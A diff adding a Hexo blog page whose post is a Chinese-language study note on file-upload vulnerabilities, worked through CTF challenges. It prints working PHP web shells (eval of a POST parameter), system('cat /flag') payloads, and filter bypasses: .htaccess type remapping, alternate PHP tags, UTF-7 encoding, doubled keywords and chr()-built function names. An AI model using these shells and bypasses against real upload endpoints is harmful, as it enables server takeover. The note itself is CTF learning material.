@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+              
+    
+    
+    
+    
+    
+    <title>
+          
+            Hexo
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/images/avatar.webp">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                Archives
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/about/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                About
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="https://garybear.cn/" link>
+            <v-list-item-icon><v-icon>rss_feed</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                我的博客
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="https://garybear.cn/hexo-theme-insulin/doc/#/" link>
+            <v-list-item-icon><v-icon>insert_drive_file</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                说明文档
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2020/10/25/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">.htaccess文件换行绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">动态拼接函数绕过函数过滤</span></a></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:kb1000fx@gmail.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/kb1000fx" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://steamcommunity.com/profiles/76561198346798163" target="_blank">
+                    <v-icon>fab fa-steam</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://weibo.com/kb1000fx" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2015 - 2020 
+                John Doe
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Hexo</a>
+      </div>
+      <div id="site-description"></div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/about/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="https://garybear.cn/">
+              <v-icon>rss_feed</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="https://garybear.cn/hexo-theme-insulin/doc/#/">
+              <v-icon>insert_drive_file</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2020/10/25/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"></a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2020-10-25
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2020-10-25
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;Uncategorized
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <p>上传漏洞学习笔记</p>
+<p>一.前提</p>
+<p>安装jdk<br>安装burpsuite<br>浏览器配置代理：添加插件proxy——配置代理<br>浏览器添加证书：<br>proxy——options——Import/exportCA certificate——Certificate in DER format——next——Select file——文件名<br>火狐——选项——隐私与安全——证书——查看证书——导入——导入证书——信任打勾——确定</p>
+<p><img src="https://i.loli.net/2020/10/25/FcX4QAaGtVYgmDN.png" alt="屏幕截图_41_.png"></p>
+<p>二..htaccess任意文件解析</p>
+<blockquote>
+<p>1.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p>
+</blockquote>
+<p>当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀，导致其他后缀的文件被解析为php。导致远程代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>.htaccess文件配置信息,这里将后缀为aaa的文件均解析为php文件</p>
+<p>短标签绕过</p>
+<ul>
+<li>JS风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>短标签风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</p>
+</blockquote>
+<ul>
+<li>ASP风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>官方默认风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>列如：做题目upload2 </p>
+ <?php 会被过滤不能上传
+
+![_39_.png](https://i.loli.net/2020/10/25/MeIrxCzgNO7fSBW.png)
+
+新建三个文件，格式分别为.htaccess，.aaa和.aaa
+
+在.htaccess文件里输入AddType application/x-httpd-php .aaa保存，
+
+在.aaa文件里输入<script language="php">@eval($_POST['cmd']);</script>保存
+
+在最后一个文件里输入<script language="php">system('cat /flag');</script>
+
+然后依次上传文件，得到flag flag{c0eb49ec-bd0a-45b9-8dfb-98b49573e0ee}
+
+![_43_.png](https://i.loli.net/2020/10/25/9KcYDE45gbVaZh1.png)
+</blockquote>
+<p>  特殊编码绕过(UTF-7)</p>
+<p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>.htaccess</code>解码对应的文件，例如可以使用UTF-7进行解码：(<a target="_blank" rel="noopener" href="http://toolswebtop.com/text/process/encode/utf-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.novel.tools/encode/UTF-7">https://www.novel.tools/encode/UTF-7</a></p>
+<p>例如：题目upload4得去解码</p>
+<p><img src="https://i.loli.net/2020/10/25/EdLQhDr86nSKyWB.png" alt="fe1d1d7688d52bfe86d4c305f5800d6.png"></p>
+<p>但不知道为什么最后有个不能解，只能看文档一个一个改</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。</p>
+<ul>
+<li>题目</li>
+</ul>
+<p>upload3</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么卡在蚁剑连接上，所以这道题没解出来</p>
+<p><img src="https://i.loli.net/2020/10/25/hzKUEL5C3RN9IrD.png" alt="屏幕截图_50_.png"></p>
+<h3 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h3><p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
+<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
+<ul>
+<li>题目</li>
+</ul>
+<p>upload6</p>
+<ul>
+<li><p>过滤掉application，则使用换行绕过</p>
+</li>
+<li><p>.htaccess</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<p>提示：内容不能有application</p>
+<p>尝试使用.htaccess文件换行绕过。</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/25/41IJVPTKQYpoeyM.png" alt="3e6ba32c22e0ea7345d671f7b206994.png"></p>
+<p><img src="https://i.loli.net/2020/10/25/Npzw9CmM8cPnOf2.png" alt="屏幕截图_51_.png"></p>
+<h3 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h3><p>对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。</p>
+<p>使用脚本快速生成指定函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111)</p>
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>例如题目upload7</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>上传1.aaa 提示：不能含有危险函数！</p>
+<p><img src="https://i.loli.net/2020/10/25/o8OJqZ7UhRjw3BW.png" alt="275bcbbcfd1564fe0796d0b8e98061d.png"></p>
+<p>使用burp suite抓包看看，发现eval和POST被过滤了。</p>
+<p>尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。</p>
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">115</span>).chr(<span class="number">121</span>).chr(<span class="number">115</span>).chr(<span class="number">116</span>).chr(<span class="number">101</span>).chr(<span class="number">109</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/25/lBhNI1jsAXfEM8K.png" alt="5d947708e4b455bb94e487f48ae7bb3.png"></p>
+</blockquote>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+        
+            <v-btn text disabled></v-btn>
+        
+          
+            <v-btn text class="float-right font-weight-bold" href="/2020/10/19/typora/">      
+                
+                <v-icon>chevron_right</v-icon>
+            </v-btn>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2015 - 2020 John Doe</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+
+
+</body>
+</html>
